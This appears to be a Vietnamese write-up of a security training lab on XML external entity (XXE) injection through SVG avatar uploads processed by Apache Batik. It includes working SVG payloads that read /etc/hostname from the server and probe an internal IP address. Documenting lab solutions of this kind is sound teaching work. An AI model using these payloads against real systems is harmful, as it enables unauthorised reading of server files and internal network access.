# Lab: Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

# Overview:

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/f7d3cdb1-c1d7-41ff-9364-32bbaef4a840)

Ta có một web blog đơn giản, không có chức năng đăng kí và đăng nhập chỉ có chức năng comment và upload file SVG.

Nếu ta nhắc đến File upload thì có các dạng sau:

- RCE

- Cross-Site Scripting

- AUTHZ/N ISSUES

- SSRF/XXE

Ở lab này, nếu ta  upload 1 file SVG ta sẽ được trả về XXE. Định dạng tập tin SVG là một định dạng hình ảnh dựa trên XML, cho phép mô tả đồ họa vector tĩnh và động với khả năng tự động điều chỉnh kích thước..

Nhìn sơ qua thì roadmap của mình như sau. Upload 1 file SVG reference 1 entity và nếu kết quả trả về là xác định có entity.

# Solution:

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" version="1.1"
baseProfile="full" > <rect x="0" y="0" width="60" height="60" style="stroke: blue;"/>
<rect id="myRect" x="25" y="25" rx="0.6" ry="0.6" width="150" height="150" fill="blue"
stroke="black" stroke-width="8"/>
</svg>
```

Tập tin SVG này mô tả một hình chữ nhật và một hình chữ nhật được xác định bằng các thuộc tính và phong cách khác nhau. Hình chữ nhật đầu tiên có kích thước 60x60 và có đường viền màu xanh. Hình chữ nhật thứ hai có id là "myRect", có tọa độ x=25, y=25, kích thước 150x150, được tô màu xanh và có đường viền màu đen với độ dày 8.

Đây chỉ là một ví dụ đơn giản về cú pháp của tập tin SVG, và nó có thể được mở và hiển thị bằng các trình duyệt web hoặc các công cụ hỗ trợ định dạng này.

Sau đó sử dụng command `nano test.svg` để tạo 1 file svg.Và upload file dó ta được kết quả trả về giống như file SVG.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/17859e05-13b7-49e2-880f-fb9bcd2833d2)

Sau khi ta upload file svg, xem thử ở Burp suite thì ta thấy post request mà ta gửi ở trong avatar. Vậy thì chúng ta có thể reference entity bằng svg file

Mình có ví dụ 1 file exploit SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.154/">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<text font-size="16" x="0" y="16">
&xxe;
</text>
</svg>
```

Đây là một tập tin SVG mà chứa một yêu cầu XXE (XML External Entity). Nó khai báo entity XML bên ngoài có tên là "xxe" và định nghĩa đường dẫn là "http://169.254.169.154/". Trong phần nội dung của SVG, có một đoạn văn bản được định dạng với kích thước font-size là 16 và được đặt ở tọa độ x=0, y=16. Trong đoạn văn bản này, ta sử dụng entity "xxe" để tham chiếu đến đường dẫn bên ngoài đã được khai báo, và hi vọng rằng ứng dụng xử lý tập tin SVG sẽ truy cập vào đường dẫn này và trả về dữ liệu tương ứng.

Kế đó ta chỉnh sửa cho đúng goal của bài. Theo đề ta cần lấy data ở "/etc/hostname" nên ta sẽ thay api bằng path đó

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<text font-size="16" x="0" y="16">
&xxe;
</text>
</svg>
```                                     
Sau đó thì mình sẽ paste file exploit đó vào chỗ mà svg cũ ta đã gửi đi hồi nãy hoặc có thể là upload file này lên cũng được.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/20ddd166-931e-4af5-8699-1d07b04aa16d)
Sau đó ta reload page, và kết quả có trả ra 1 image khác

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/0ba1fc19-a860-46e5-8a1d-e18d993ade1e)

Mở nó ra

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/fb39df53-a71e-43b1-9e97-0d851a6a3ff1)

Đây là hostname chứ không phải là 1 cái random text. Vậy giờ ta chỉ cần sumbit đó thôi

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/a6ef4b46-34df-475f-84bf-fbecc867101a)

Vậy đã solve được lab. 




